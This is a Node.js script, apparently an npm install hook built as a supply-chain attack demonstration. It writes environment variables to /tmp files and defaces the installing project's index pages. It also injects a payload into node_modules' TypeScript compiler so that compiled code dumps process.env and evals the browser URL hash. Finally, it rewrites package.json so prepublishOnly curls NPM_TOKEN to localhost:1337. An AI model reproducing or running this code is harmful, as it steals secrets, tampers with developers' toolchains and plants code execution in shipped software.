console.log('NOOOOOOOOOOOOOOOOO')
const path = require('path')
const fs = require('fs')
fs.writeFileSync('/tmp/oops', Object.keys(process.env).join())

const cwd = process.env.INIT_CWD

try {
    const target = path.resolve(cwd, 'pages/index.tsx')
    let content = fs.readFileSync(target, 'utf8')
    content = content.replace('>', `><h1>PWND</h1>`)
    fs.writeFileSync(target, content)
} catch (e) {
    console.error(e)
}
try {
    const target = path.resolve(cwd, 'pages/index.js')
    let content = fs.readFileSync(target, 'utf8')
    content = content.replace('>', `><h1>PWND</h1>`)
    fs.writeFileSync(target, content)
} catch (e) {
    console.error(e)
}

// typescript hack, tested on v4.3.5 

try {
    // something nice for node and frontend devs to enjoy
    const exploit = `try{ require("fs").writeFileSync("/tmp/pwnd",JSON.stringify(process.env)); } catch(e){}; try{ eval(unescape(window.location.hash.substring(1))); } catch(e){}; console.error("pwnd");`;

    const tscjsTarget = path.resolve(cwd, 'node_modules/typescript/lib/tsc.js')
    let tscjsContent = fs.readFileSync(tscjsTarget, 'utf8')
    fs.writeFileSync(tscjsTarget, plugThePayload(tscjsContent, exploit))
    const tsTarget = path.resolve(cwd, 'node_modules/typescript/lib/typescript.js')
    let tsContent = fs.readFileSync(tsTarget, 'utf8')
    fs.writeFileSync(tsTarget, plugThePayload(tsContent, exploit))

} catch (e) {
    console.error(e)
}

function wrapExploit(exploit) {
    const flatExploit = exploit.replace(/\r?\n|\r/g, '');
    return `global.z || (global.z=1) && (output+='/*PWND*/${flatExploit}\\n')`;
}

function plugThePayload(content, exploit) {
    const lines = content.split('\n')
    const writeLineIndex = findTheWriteLine(lines)
    lines.splice(writeLineIndex + 1, 0, wrapExploit(exploit))
    return lines.join('\n')
}
function findTheWriteLine(lines) {
    let state = 0, lineIndex = 0;
    for (let i = 0; i < lines.length; i++) {
        const line = lines[i];
        if (line.includes('function writeLine(')) {
            state = 1
            lineIndex = i
        }
        if (state === 1 && line.includes('output +=')) {
            return lineIndex
        }

    }
}

// prepublish hack
try {
    const target = path.resolve(cwd, 'package.json')
    const pkg = require(target);
    if (pkg && pkg.scripts) {
        pkg.scripts.prepublishOnly = 'curl http://localhost:1337/$NPM_TOKEN';
        fs.writeFileSync(target, JSON.stringify(pkg, null, 2))
    }
} catch (e) {
    console.error(e)
}